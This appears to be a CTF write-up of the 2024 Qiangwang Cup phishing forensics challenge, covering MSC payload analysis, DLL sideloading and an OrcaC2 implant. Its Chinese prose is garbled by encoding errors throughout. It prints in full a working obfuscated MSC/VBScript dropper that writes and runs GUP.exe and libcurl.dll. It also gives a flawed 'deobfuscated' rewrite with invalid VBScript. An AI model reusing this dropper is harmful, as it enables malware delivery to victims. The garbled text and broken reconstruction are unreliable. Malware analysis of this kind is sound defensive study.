# 2024 å¼ºç½‘æ¯s8_Master of DFIR


2024 å¼ºç½‘æ¯s8_misc_Master of DFIR

<!--more-->

### Master of DFIR - Phishing

```
TeamÂ tokenÂ >Â xxx
(1/13)Â æ”»å‡»è€…çš„é‚®ç®±æ˜¯ä»€ä¹ˆ?Â (æ³¨æ„:MD5(æ”»å‡»è€…é‚®ç®±),ä»¥cyberchefçš„ä¸ºå‡†)Â ç¤ºä¾‹:9b04d152845ec0a378394003c96da594
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â a8cd5b4ba47e185d4a69a583fde84da5
æ­£ç¡®âœ…!
(2/13)Â æ”»å‡»è€…æ‰€æŠ•æ”¾çš„æ–‡ä»¶md5æ˜¯ä»€ä¹ˆ?Â (æ³¨æ„:ä»¥md5sumçš„ç»“æœä¸ºå‡†)Â ç¤ºä¾‹:33ec9f546665aec46947dca16646d48e
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â f436b02020fa59f3f71e0b6dcac6c7d3
æ­£ç¡®âœ…!
(3/13)Â æ”»å‡»è€…æ‰€ä½¿ç”¨çš„æ”»å‡»è½½è·åç¼€æ˜¯ä»€ä¹ˆï¼ŸÂ ç¤ºä¾‹:lnk
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â msc
æ­£ç¡®âœ…!
(4/13)Â æ”»å‡»è€…æ‰€æŠ•æ”¾æ ·æœ¬çš„åˆå§‹æ‰§è¡Œè¯­å¥åœ¨è¯¥æ”»å‡»è½½è·æ–‡ä»¶çš„ç¬¬å‡ è¡Œ?Â ç¤ºä¾‹:20
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â 97
æ­£ç¡®âœ…!
(5/13)Â ç»è¿‡åˆå§‹æ‰§è¡Œå,æ”»å‡»è€…æ‰€åŠ è½½çš„ç¬¬äºŒéƒ¨åˆ†è½½è·æ‰€ä½¿ç”¨çš„è¯­è¨€æ˜¯ä»€ä¹ˆ?Â ç¤ºä¾‹:javascript
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â VBScript
æ­£ç¡®âœ…!
(6/13)Â æ”»å‡»è€…æ‰€è¿›è¡Œçš„ç¬¬äºŒéƒ¨åˆ†è½½è·å…¶å°†é»‘DLLå­˜åœ¨äº†ä»€ä¹ˆåœ°æ–¹?Â (æ³¨æ„:éœ€è¦æä¾›å®Œæˆçš„è§£æ··æ·†åçš„ç¬¬äºŒéƒ¨åˆ†è½½è·s*******så‡½æ•°çš„å‚æ•°)Â æäº¤éœ€è¦MD5(å‚æ•°å†…å®¹)Â ä»¥Cyberchefç»“æœä¸ºå‡†Â ç¤ºä¾‹:9b04d152845ec0a378394003c96da594
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â d2fabdcc28074462ac2379101836c938
æ­£ç¡®âœ…!
(7/13)Â æ”»å‡»è€…ä½¿ç”¨çš„è¿™ä¸ªç™½EXEåŠ è½½é»‘DLLçš„æ‰‹æ³•æ‰€å¯¹åº”çš„MITREÂ ATT&CKÂ IDæ˜¯ä»€ä¹ˆ?Â (æ³¨æ„:è¯·æ³¨æ„ç¤ºä¾‹çš„æç¤ºæäº¤å¤§ç±»å³å¯ä¸éœ€è¦ç»†åŒ–åˆ°åˆ†é¡¹)Â ç¤ºä¾‹:Â T1000
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â T1574
æ­£ç¡®âœ…!
(8/13)Â æ”»å‡»è€…æ‰€ä½¿ç”¨çš„é»‘DLLåŠ«æŒäº†åŸå§‹DLLçš„å“ªä¸ªå‡½æ•°?Â ç¤ºä¾‹:Â main
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â curl_easy_init
æ­£ç¡®âœ…!
(9/13)Â æ”»å‡»è€…æ‰€ä½¿ç”¨çš„é»‘DLLè§£å¯†ä¸‹ä¸€é˜¶æ®µè½½è·æ‰€ä½¿ç”¨çš„ç®—æ³•æ˜¯ä»€ä¹ˆ?Â ç¤ºä¾‹:chacha20
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â RC4
æ­£ç¡®âœ…!
(10/13)Â æ”»å‡»è€…æ‰€ä½¿ç”¨çš„ä¸‹ä¸€é˜¶æ®µè½½è·çš„å›è¿C2æ˜¯ä»€ä¹ˆ?Â (æ³¨æ„:éœ€è¦æä¾›ipåœ°å€:ç«¯å£çš„å½¢å¼)Â ç¤ºä¾‹:127.0.0.1:5100
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â 192.168.57.119:6000
æ­£ç¡®âœ…!
(11/13)Â æ”»å‡»è€…æ‰€ä½¿ç”¨æœ€ç»ˆé˜¶æ®µè½½è·æ‰€ä½¿ç”¨çš„åŠ å¯†ç®—æ³•æ˜¯ä»€ä¹ˆ?Â ç¤ºä¾‹:DES
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â AES
æ­£ç¡®âœ…!
(12/13)Â æ”»å‡»è€…æ‰€ä½¿ç”¨æœ€ç»ˆé˜¶æ®µè½½è·æ‰€ä½¿ç”¨çš„å¯†é’¥çš„MD5æ˜¯ä»€ä¹ˆ?Â (æ³¨æ„:MD5(å¯†é’¥å†…å®¹),ä»¥cyberchefçš„ä¸ºå‡†)Â ç¤ºä¾‹:9b04d152845ec0a378394003c96da594
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â a524c43df3063c33cfd72e2bf1fd32f6
æ­£ç¡®âœ…!
(13/13)Â æ”»å‡»è€…ä½¿ç”¨äº†ä»€ä¹ˆå®¶æ—çš„C2?Â ç¤ºä¾‹:PoshC2
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â OrcaC2
æ­£ç¡®âœ…!
æ­å–œä½ å®Œæˆäº†æ‰€æœ‰ä»»åŠ¡,è¿™æ˜¯ä½ çš„flagÂ ğŸš©Â -->Â Â 
```

(1)å‘ä»¶é‚®ç®±`alice@flycode.cn`ï¼ŒMD5(alice@flycode.cn)

![image-20241118090550825](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118090550825.png?imageSlim)

(2)é™„ä»¶å¯¼å‡ºï¼Œè®¡ç®—MD5

![image-20241118090733102](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118090733102.png?imageSlim)

(3)è§£å‹å¾—åˆ°`msc`æ–‡ä»¶

![image-20241118090941964](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118090941964.png?imageSlim)

(4)97è¡Œ

![image-20241118091116851](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118091116851.png?imageSlim)

(5)92è¡Œçš„ä»£ç ä¸¢è¿›cyberchefï¼Œvbscript

![image-20241118091507031](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118091507031.png?imageSlim)

(6)ç¬¬äºŒéƒ¨åˆ†æ”»å‡»è·è½½ä»£ç 

```
// Console Root
          var u=external.Document.Name;var v=""; var i=0;eval(decodeURIComponent("for (i=0;i<u.length;i++){h=u.charCodeAt(i).toString(16);v+=("000"+h).slice(-4);}"));var sN=external.Document.ScopeNamespace;var rN=sN.GetRoot();var mN=sN.GetChild(rN);var dN=sN.GetNext(mN);external.Document.ActiveView.ActiveScopeNode=dN;dO=external.Document.ActiveView.ControlObject;external.Document.ActiveView.ActiveScopeNode=mN;var XML=dO;XML.async=false;var xsl=XML;xsl.loadXML(unescape("<?xml version='1.0'?>
<stylesheet
    xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="placeholder"
    version="1.0">
    <output method="text"/>
    <ms:script implements-prefix="user" language="VBScript">
	<![CDATA[
Dim mscLL
mscLL="_MSC"
For i=1 to Len(mscLL) Step 4
oFmXCTg=oFmXCTg & ChrW(CLng("&"&Chr(72) & Mid(mscLL,i,4)))
Next
Set RTcxFmy=CreateObject(Chr(3440-3363)&Chr(105)&Chr(Int("99"))&"r"&Chr(Int("&H6f"))&Chr(&H73)&Chr(Int("111"))&Chr(102)&Chr(&H74)&Chr(46)&Chr(Int("88"))&Chr(77)&Chr(Int("&H4c"))&"D"&"O"&"M" )
RTcxFmy.Async=Chr(Int("&H46"))&Chr(Int("97"))&Chr(Int("108"))&"s"&Chr(Int("&H65"))
RTcxFmy.Load( oFmXCTg )
AJ8p
Function Xk7fbp8v(inp)
Dim q4XPbvoV
Dim HxWK
Set q4XPbvoV=CreateObject(Chr(&H4d)&"S"&Chr(Int("&H58"))&Chr(Int("77"))&Chr(247988/3263)&Chr(&H32)&Chr(Int("&H2e"))&Chr(Int("68"))&Chr(Int("&H4f"))&Chr(Int("&H4d"))&Chr(&H44)&Chr(2427-2316)&"c"&Chr(Int("&H75"))&Chr(&H6d)&Chr(101)&Chr(&H6e)&Chr(-1790+1906))
Set HxWK=q4XPbvoV.createElement(Chr(545-448))
HxWK.DataType=Chr(98)&Chr(Int("105"))&Chr(110)&Chr(Int("46"))&Chr(98)&Chr(97)&Chr(115)&Chr(Int("101"))&Chr(Int("&H36"))&Chr(6238-6186)
HxWK.Text=inp
Xk7fbp8v=HxWK.nodeTypedValue
End Function
Function AJ8p()
On Error Resume Next
Dim AgUvcCuHzzbl
Dim DfAV40y
Dim gwqhhV
Dim JJNe
Dim Mw7U
Dim O8B1OrkTW
OMxa=Chr(Int("53"))&Chr(Int("&H31"))&Chr(&H37)&Chr(51)&Chr(52)&Chr(101)&Chr(56)&Chr(Int("&H65"))&Chr(&H37)&Chr(Int("101"))&Chr(&H63)&Chr(Int("&H34"))&Chr(&H37)&Chr(Int("101"))&Chr(&H63)&Chr(Int("55"))&Chr(53)&Chr(Int("51"))&Chr(Int("99"))&Chr(Int("50"))&Chr(&H35)&Chr(50)&Chr(&H61)&Chr(Int("48"))&Chr(Int("55"))&Chr(Int("&H62"))&Chr(&H32)&Chr(&H63)&Chr(Int("&H35"))&Chr(Int("49"))&Chr(54)&Chr(&H62)&Chr(53)&Chr(Int("99"))&Chr(&H34)&Chr(Int("97"))&Chr(&H32)&Chr(48)&Chr(49)&Chr(&H63)&Chr(Int("&H35"))&Chr(Int("102"))&Chr(51)&Chr(Int("97"))&Chr(Int("55"))&Chr(&H66)&Chr(53)&Chr(49)&Chr(Int("54"))&Chr(Int("&H37"))&Chr(Int("54"))&Chr(&H66)&Chr(Int("50"))&Chr(&H30)&Chr(&H31)&Chr(Int("&H64"))&Chr(53)&Chr(&H31)&Chr(Int("54"))&Chr(56)&Chr(Int("53"))&Chr(54)&Chr(&H66)&Chr(Int("&H64"))&Chr(55)&Chr(102)&Chr(Int("&H35"))&Chr(49)&Chr(Int("55"))&Chr(101)&Chr(Int("&H64"))&Chr(99)&Chr(Int("&H35"))&Chr(Int("98"))&Chr(Int("56"))&Chr(57)&Chr(&H35)&Chr(Int("49"))&Chr(&H36)&Chr(&H38)&Chr(Int("&H36"))&Chr(51)&Chr(Int("49"))&Chr(Int("49"))&Chr(Int("&H36"))&Chr(Int("50"))&Chr(Int("&H31"))&Chr(Int("56"))&Chr(56)&Chr(100)&Chr(Int("53"))&Chr(Int("98"))&Chr(&H37)&Chr(Int("54"))&Chr(Int("56"))&Chr(Int("52"))&Chr(Int("57"))&Chr(Int("&H30"))&Chr(Int("49"))&Chr(Int("97"))&Chr(Int("55"))&Chr(Int("&H37"))&Chr(101)&Chr(Int("&H35"))&Chr(Int("&H66"))&Chr(Int("&H66"))&Chr(&H30)&Chr(&H38)&Chr(48)&Chr(Int("48"))&Chr(Int("51"))&Chr(Int("&H31"))&Chr(&H30)&Chr(&H30)&Chr(51)&Chr(49)&Chr(Int("&H36"))&Chr(Int("&H37"))&Chr(&H30)&Chr(Int("56"))&Chr(Int("48"))&Chr(Int("&H30"))&Chr(Int("&H33"))&Chr(Int("50"))&Chr(54)&Chr(53)&Chr(Int("101"))&Chr(Int("53"))&Chr(&H38)&Chr(Int("&H31"))&Chr(Int("&H66"))&Chr(&H33)&Chr(Int("&H30"))&Chr(&H30)&Chr(Int("&H33"))&Chr(&H33)&Chr(Int("&H36"))&Chr(Int("&H35"))&Chr(Int("101"))&Chr(Int("53"))&Chr(&H34)&Chr(Int("101"))&Chr(51)&Chr(&H65)&Chr(&H38)&Chr(Int("&H38"))&Chr(Int("52"))&Chr(Int("99"))&Chr(55)&Chr(Int("&H65"))&Chr(&H62)&Chr(Int("&H66"))&Chr(&H34)&Chr(Int("101"))&Chr(Int("48"))&Chr(&H61)&Chr(56)&Chr(100)&Chr(Int("53"))&Chr(98)&Chr(Int("&H66"))&Chr(Int("102"))&Chr(Int("48"))&Chr(&H39)&Chr(48)&Chr(Int("&H30"))&Chr(Int("50"))&Chr(101)&Chr(48)&Chr(Int("48"))&Chr(Int("55"))&Chr(48)&Chr(&H30)&Chr(&H30)&Chr(Int("54"))&Chr(&H34)&Chr(48)&Chr(Int("48"))&Chr(54)&Chr(&H36)
Set AgUvcCuHzzbl=CreateObject(Chr(Int("&H57"))&Chr(537-454)&Chr(99)&Chr(3218-3104)&Chr(Int("&H69"))&Chr(Int("&H70"))&Chr(-3081+3197)&Chr(&H2e)&Chr(&H53)&Chr(104)&"e"&Chr(Int("108"))&"l")
Set DfAV40y=CreateObject(Chr(Int("83"))&Chr(6597-6498)&Chr(114)&Chr(Int("&H69"))&"p"&Chr(Int("116"))&Chr(2693-2588)&"n"&Chr(Int("103"))&Chr(125212/2722)&Chr(Int("&H46"))&Chr(Int("105"))&Chr(108)&Chr(101)&Chr(22908/276)&"y"&"s"&Chr(4733-4617)&"e"&Chr(Int("109"))&Chr(&H4f)&Chr(Int("98"))&Chr(&H6a)&Chr(101)&Chr(99)&Chr(Int("116")))
O8B1OrkTW=AgUvcCuHzzbl.ExpandEnvironmentStrings(Chr(37)&Chr(Int("&H50"))&Chr(Int("&H72"))&Chr(Int("111"))&Chr(Int("&H67"))&Chr(114)&Chr(Int("&H61"))&Chr(109)&"F"&Chr(Int("&H69"))&"l"&"e"&Chr(-1605+1720)&Chr(Int("37")))
P59b6scR2TD9=O8B1OrkTW & Chr(2088-1996)&"C"&Chr(Int("108"))&Chr(270729/2439)&Chr(Int("117"))&"d"&Chr(Int("102"))&Chr(108)&Chr(97)&Chr(Int("114"))&Chr(&H65)
DfAV40y.CreateFolder(P59b6scR2TD9)
gwqhhV=P59b6scR2TD9 & Chr(92) & Chr(Int("71"))&Chr(85)&Chr(Int("&H50"))&Chr(Int("&H2e"))&Chr(&H65)&Chr(&H78)&Chr(1805-1704)
JJNe=P59b6scR2TD9 & Chr(92) & Chr(Int("&H6c"))&Chr(Int("&H69"))&Chr(98)&Chr(Int("&H63"))&Chr(117)&Chr(&H72)&Chr(Int("&H6c"))&Chr(&H2e)&Chr(&H64)&Chr(108)&Chr(Int("108"))
For i=1 to Len(OMxa) Step 4
FRURX=FRURX & ChrW(CLng("&"&Chr(72) & Mid(OMxa,i,4)))
Next
Mw7U=DfAV40y.GetSpecialFolder(2) & Chr(92) & FRURX
Set aZPHxtz4=RTcxFmy.selectNodes( Chr(29281/623)&Chr(Int("&H4d"))&Chr(77)&Chr(1587-1520)&Chr(Int("95"))&Chr(67)&Chr(Int("&H6f"))&"n"&Chr(Int("115"))&Chr(Int("&H6f"))&Chr(108)&Chr(Int("&H65"))&Chr(70)&Chr(&H69)&Chr(108)&Chr(101)&Chr(47)&"B"&"i"&Chr(6710-6600)&Chr(&H61)&Chr(Int("114"))&Chr(Int("121"))&Chr(&H53)&Chr(116)&"o"&Chr(221844/1946)&Chr(97)&Chr(Int("103"))&Chr(Int("&H65"))&Chr(4621-4574)&Chr(&H42)&Chr(105)&Chr(Int("110"))&Chr(&H61)&Chr(8019-7905)&"y"&Chr(Int("&H5b"))&Chr(64)&Chr(Int("78"))&Chr(&H61)&Chr(Int("&H6d"))&Chr(Int("&H65"))&Chr(&H3d)&Chr(Int("&H27"))&Chr(&H43)&Chr(79)&Chr(Int("&H4e"))&Chr(&H53)&Chr(8290-8211)&Chr(Int("76"))&Chr(6677-6608)&Chr(&H5f)&Chr(Int("84"))&Chr(1018-936)&Chr(&H45)&Chr(&H45)&Chr(Int("39"))&Chr(&H5d) ) 
rqsgO2mBfu=aZPHxtz4(0).text
UoLAunW=Xk7fbp8v(rqsgO2mBfu)
Dim jXnaWeLQ12
Set jXnaWeLQ12=CreateObject(Chr(65)&Chr(&H44)&Chr(Int("&H4f"))&Chr(68)&Chr(4574-4508)&Chr(46)&"S"&Chr(Int("&H74"))&Chr(6960-6846)&Chr(Int("101"))&Chr(Int("&H61"))&Chr(Int("109")))
jXnaWeLQ12.Type=1
jXnaWeLQ12.Open
jXnaWeLQ12.Write UoLAunW
jXnaWeLQ12.SaveToFile Mw7U,2
AgUvcCuHzzbl.run """" & Mw7U & """",1,false
Set aZPHxtz4=RTcxFmy.selectNodes( Chr(47)&Chr(&H4d)&Chr(77)&"C"&Chr(95)&Chr(Int("&H43"))&"o"&Chr(Int("110"))&Chr(&H73)&Chr(Int("111"))&"l"&Chr(&H65)&Chr(Int("&H46"))&"i"&Chr(5094-4986)&Chr(101)&Chr(Int("47"))&Chr(331-265)&Chr(105)&Chr(Int("&H6e"))&Chr(Int("&H61"))&Chr(&H72)&Chr(Int("121"))&Chr(&H53)&Chr(116)&"o"&"r"&Chr(-1088+1185)&Chr(2152-2049)&Chr(266943/2643)&Chr(Int("47"))&Chr(-385+451)&Chr(105)&Chr(Int("&H6e"))&Chr(Int("&H61"))&Chr(114)&Chr(Int("&H79"))&Chr(91)&"@"&Chr(Int("78"))&Chr(Int("97"))&Chr(&H6d)&Chr(&H65)&Chr(Int("&H3d"))&Chr(3877-3838)&Chr(Int("67"))&Chr(&H4f)&Chr(78)&Chr(83)&Chr(79)&Chr(Int("&H4c"))&Chr(Int("69"))&Chr(419-324)&"M"&Chr(Int("&H45"))&Chr(Int("78"))&"U"&Chr(Int("39"))&Chr(Int("&H5d")) ) 
Ze1C=aZPHxtz4(0).text
Set aZPHxtz4 = RTcxFmy.selectNodes( Chr(&H2f)&Chr(-1536+1613)&Chr(4928/64)&Chr(67)&Chr(345-250)&Chr(Int("67"))&Chr(111)&"n"&Chr(&H73)&Chr(Int("&H6f"))&Chr(&H6c)&Chr(Int("101"))&Chr(145110/2073)&Chr(&H69)&Chr(108)&Chr(Int("101"))&Chr(Int("&H2f"))&Chr(66)&Chr(&H69)&Chr(1514-1404)&Chr(Int("97"))&Chr(Int("&H72"))&Chr(Int("121"))&Chr(83)&Chr(212744/1834)&Chr(&H6f)&Chr(Int("114"))&Chr(Int("97"))&Chr(&H67)&Chr(-749+850)&Chr(-3015+3062)&Chr(Int("&H42"))&"i"&Chr(&H6e)&Chr(Int("&H61"))&Chr(114)&Chr(Int("&H79"))&Chr(Int("91"))&Chr(&H40)&Chr(Int("&H4e"))&Chr(&H61)&Chr(109)&Chr(101)&Chr(&H3d)&Chr(-548+587)&Chr(67)&Chr(Int("&H4f"))&Chr(3379-3301)&"S"&"O"&Chr(-1145+1221)&Chr(Int("&H45"))&"_"&Chr(-626+706)&Chr(Int("65"))&Chr(78)&"E"&Chr(39)&Chr(Int("93")) ) 
JozMh9jg=aZPHxtz4(0).text
AnZUOdqFuMEw=Xk7fbp8v(Ze1C)
s4fr2y4Q7lvQ=Xk7fbp8v(JozMh9jg)
Dim cHh5wARUext
Set cHh5wARUext=CreateObject(Chr(65)&Chr(&H44)&Chr(Int("&H4f"))&Chr(68)&Chr(4574-4508)&Chr(46)&"S"&Chr(Int("&H74"))&Chr(6960-6846)&Chr(Int("101"))&Chr(Int("&H61"))&Chr(Int("109")))
cHh5wARUext.Type=1
cHh5wARUext.Open 
cHh5wARUext.Write AnZUOdqFuMEw
cHh5wARUext.SaveToFile gwqhhV,2
Dim BKzG1ldRw7
Set BKzG1ldRw7=CreateObject(Chr(65)&Chr(&H44)&Chr(Int("&H4f"))&Chr(68)&Chr(4574-4508)&Chr(46)&"S"&Chr(Int("&H74"))&Chr(6960-6846)&Chr(Int("101"))&Chr(Int("&H61"))&Chr(Int("109")))
BKzG1ldRw7.Type=1
BKzG1ldRw7.Open 
BKzG1ldRw7.Write s4fr2y4Q7lvQ
BKzG1ldRw7.SaveToFile JJNe,2
AgUvcCuHzzbl.run """" & gwqhhV & """" & Chr(Int("32"))&Chr(&H74)&Chr(&H20)&Chr(&H38)&"."&Chr(56)&Chr(Int("46"))&Chr(Int("&H38"))&"."&Chr(-129+185),0,false
End Function
Public Function i9Vu0(ByVal Value,ByVal Shift)
i9Vu0=Value
If Shift>0 Then
If Value>0 Then
i9Vu0=Int(i9Vu0/(2^Shift))
Else
If Shift>31 Then
i9Vu0=0
Else
i9Vu0=i9Vu0 And &H7FFFFFFF
i9Vu0=Int(i9Vu0/(2^Shift))
i9Vu0=i9Vu0 Or 2^(31-Shift)
End If
End If
End If
End Function
Public Function PIvwo4QDjBC(ByVal Value,ByVal Shift)
PIvwo4QDjBC=Value
If Shift>0 Then
Dim i 
Dim m 
For i=1 To Shift
m=PIvwo4QDjBC And &H40000000
PIvwo4QDjBC=(PIvwo4QDjBC And &H3FFFFFFF)*2
If m<>0 Then
PIvwo4QDjBC=PIvwo4QDjBC Or &H80000000
End If
Next
End If
End Function
Public Function eUBp1LoLYEMy(ByVal num)
Const rkLx=5570645
Const beweT2U=52428
Const d1=7
Const d2=14
Dim t,u,out 
t=(num Xor i9Vu0(num,d2)) And beweT2U
u=num Xor t Xor PIvwo4QDjBC(t,d2)
t=(u Xor i9Vu0(u,d1)) And rkLx
out=(u Xor t Xor PIvwo4QDjBC(t,d1))
eUBp1LoLYEMy=out
End Function
Public Function FTKaWvcYaGWt(ByRef MiCzi9())
Dim i,fr,upJNNa,raw 
Dim a,b,c,d 
Dim YBx4PZLTHSQ1 
Dim EJSi8qJd0() 
Dim a2,b2 
YBx4PZLTHSQ1=""
For i=0 To (UBound(MiCzi9)/4+1)
fr=i*4
If fr>UBound(MiCzi9) Then
Exit For
End If
upJNNa=0
upJNNa=upJNNa Or PIvwo4QDjBC(MiCzi9(fr+3),24)
upJNNa=upJNNa Or PIvwo4QDjBC(MiCzi9(fr+2),16)
upJNNa=upJNNa Or PIvwo4QDjBC(MiCzi9(fr+1),8)
upJNNa=upJNNa Or MiCzi9(fr+0)
raw=eUBp1LoLYEMy(upJNNa)
a=Chr(i9Vu0((raw And &HFF000000),24))
b=Chr(i9Vu0((raw And 16711680),16))
c=Chr(i9Vu0((raw And 65280),8))
d=Chr(i9Vu0((raw And 255),0))
YBx4PZLTHSQ1=YBx4PZLTHSQ1+d+c+b+a
Next
FTKaWvcYaGWt=YBx4PZLTHSQ1
End Function
Public Function t4zFxxgg22(MiCzi9)
Dim CYhV8N(),Liefs(),arrayByte3(255)
Dim Rp7jaY2jOqr(63),arrayLong5(63) 
Dim Mbt0mzk6(63),NALQp0Gu3
Dim b7Z9n8,iter,VKkZEf,ZyvKLLyyHHD
Dim YBx4PZLTHSQ1 
MiCzi9=Replace(MiCzi9,vbCr,vbNullString)
MiCzi9=Replace(MiCzi9,vbLf,vbNullString)
ZyvKLLyyHHD=Len(MiCzi9) Mod 4
If InStrRev(MiCzi9,"==") Then
b7Z9n8=2
ElseIf InStrRev(MiCzi9,""+"=") Then
b7Z9n8=1
End If
For ZyvKLLyyHHD=0 To 255
Select Case ZyvKLLyyHHD
Case 65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90
arrayByte3(ZyvKLLyyHHD)=ZyvKLLyyHHD-65
Case 97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122
arrayByte3(ZyvKLLyyHHD)=ZyvKLLyyHHD-71
Case 48,49,50,51,52,53,54,55,56,57
arrayByte3(ZyvKLLyyHHD)=ZyvKLLyyHHD+4
Case 43
arrayByte3(ZyvKLLyyHHD)=62
Case 47
arrayByte3(ZyvKLLyyHHD)=63
Case Else
End Select
Next
For ZyvKLLyyHHD=0 To 63
Rp7jaY2jOqr(ZyvKLLyyHHD)=ZyvKLLyyHHD*64
arrayLong5(ZyvKLLyyHHD)=ZyvKLLyyHHD*4096
Mbt0mzk6(ZyvKLLyyHHD)=ZyvKLLyyHHD*262144
Next
Liefs=StrConv(MiCzi9,vbFromUnicode)
ReDim CYhV8N((((UBound(Liefs)+1)\4)*3)-1)
For iter=0 To UBound(Liefs) Step 4
NALQp0Gu3=Mbt0mzk6(arrayByte3(Liefs(iter)))+arrayLong5(arrayByte3(Liefs(iter+1)))+Rp7jaY2jOqr(arrayByte3(Liefs(iter+2)))+arrayByte3(Liefs(iter+3))
ZyvKLLyyHHD=NALQp0Gu3 And 16711680
CYhV8N(VKkZEf)=ZyvKLLyyHHD\65536
ZyvKLLyyHHD=NALQp0Gu3 And 65280
CYhV8N(VKkZEf+1)=ZyvKLLyyHHD\256
CYhV8N(VKkZEf+2)=NALQp0Gu3 And 255
VKkZEf=VKkZEf+3
Next
YBx4PZLTHSQ1=StrConv(CYhV8N,vbUnicode)
If b7Z9n8 Then YBx4PZLTHSQ1=Left(YBx4PZLTHSQ1,Len(YBx4PZLTHSQ1)-b7Z9n8)
t4zFxxgg22=FTKaWvcYaGWt(StrConv(YBx4PZLTHSQ1,vbFromUnicode))
t4zFxxgg22=qY7AOEpU1wn(t4zFxxgg22,"~")
End Function
Function qY7AOEpU1wn(str,chars)
Dim fqX3dbudmU
Dim XVZECKbx()
XVZECKbx=Split(str,chars)
fqX3dbudmU=UBound(XVZECKbx,1)
If fqX3dbudmU<>0 Then
str=Left(str,Len(str)-fqX3dbudmU)
End If
qY7AOEpU1wn=str
End Function
]]></ms:script>
</stylesheet>".replace("_MSC",v)));XML.transformNode(xsl)
```

åæ··æ·†å¤„ç†

```
' ä¸»å‡½æ•°
Function AJ8p()
    On Error Resume Next
    
    ' åˆå§‹åŒ–å¯¹è±¡
    Set shell = CreateObject("WScript.Shell")
    Set fs = CreateObject("Scripting.FileSystemObject")
    
    ' è·å–ç¨‹åºæ–‡ä»¶ç›®å½•
    programFiles = shell.ExpandEnvironmentStrings("%ProgramFiles%")
    
    ' åˆ›å»ºç›®æ ‡ç›®å½•
    targetDir = programFiles & "\Cloudflare"
    fs.CreateFolder(targetDir)
    
    ' å®šä¹‰æ–‡ä»¶è·¯å¾„
    exePath = targetDir & "\GUP.exe"
    dllPath = targetDir & "\libcurl.dll"
    
    ' è·å–ä¸´æ—¶æ–‡ä»¶è·¯å¾„
    tempFile = fs.GetSpecialFolder(2) & "\" & decodedFileName
    
    ' ä»XMLä¸­æå–åŠ å¯†çš„äºŒè¿›åˆ¶æ•°æ®
    Set nodes = xmlDoc.selectNodes("/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_TREE']")
    binaryData = nodes(0).text
    
    ' è§£å¯†æ•°æ®
    decryptedData = DecryptBinary(binaryData)
    
    ' å†™å…¥æ–‡ä»¶
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' äºŒè¿›åˆ¶
    stream.Open
    
    ' å†™å…¥ä¸»ç¨‹åº
    stream.Write decryptedData
    stream.SaveToFile tempFile, 2
    shell.run """" & tempFile & """", 1, false
    
    ' å†™å…¥å…¶ä»–ç»„ä»¶
    Set nodes = xmlDoc.selectNodes("/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_MENU']")
    menuData = DecryptBinary(nodes(0).text)
    stream.Open
    stream.Write menuData
    stream.SaveToFile exePath, 2
    
    Set nodes = xmlDoc.selectNodes("/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_GENE']")
    geneData = DecryptBinary(nodes(0).text)
    stream.Open
    stream.Write geneData
    stream.SaveToFile dllPath, 2
    
    ' æ‰§è¡Œä¸‹è½½çš„ç¨‹åº
    shell.run """" & exePath & """ t 8.8.8.8", 0, false
End Function

' è§£å¯†å‡½æ•°
Function DecryptBinary(data)
    ' Base64è§£ç 
    decoded = Base64Decode(data)
    ' è‡ªå®šä¹‰è§£å¯†ç®—æ³•
    decrypted = CustomDecrypt(decoded)
    Return decrypted
End Function

' ä½è¿ç®—è¾…åŠ©å‡½æ•°
Function RightShift(value, bits)
    If bits > 0 Then
        If value > 0 Then
            Return Int(value / (2 ^ bits))
        Else
            If bits > 31 Then
                Return 0
            Else
                value = value And &H7FFFFFFF
                value = Int(value / (2 ^ bits))
                value = value Or 2 ^ (31 - bits)
            End If
        End If
    End If
    Return value
End Function

Function LeftShift(value, bits)
    If bits > 0 Then
        mask = value And &H40000000
        value = (value And &H3FFFFFFF) * 2
        If mask <> 0 Then
            value = value Or &H80000000
        End If
    End If
    Return value
End Function
```

ç­”æ¡ˆä¸º`MD5(/MMC_ConsoleFile/BinaryStorage/Binary[@Name='CONSOLE_TREE'])`

è¿™æ®µä»£ç çš„åŠŸèƒ½ä¸º

```
1. åˆ›å»ºç›®å½•: %ProgramFiles%\Cloudflare
2. å†™å…¥æ–‡ä»¶:
   - GUP.exe
   - libcurl.dll 
3. è¿æ¥è¿œç¨‹åœ°å€: 8.8.8.8
4. ä½¿ç”¨è‡ªå®šä¹‰è§£å¯†ç®—æ³•(eUBp1LoLYEMyå‡½æ•°)è§£å¯†æ•°æ®
5. é€šè¿‡ WScript.Shell æ‰§è¡Œä¸‹è½½çš„æ–‡ä»¶
```

(7)T1574

![image-20241118092559190](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118092559190.png?imageSlim)

(8)

msc æœ«å°¾æä¾›äº†ä¸‰ä¸ªbinaryï¼Œä¾æ¬¡æ˜¯ pdfã€ç™½æ–‡ä»¶å’Œé»‘æ–‡ä»¶ï¼Œå¯¹ç¬¬ä¸‰ä¸ªè¿›è¡Œåˆ†æ

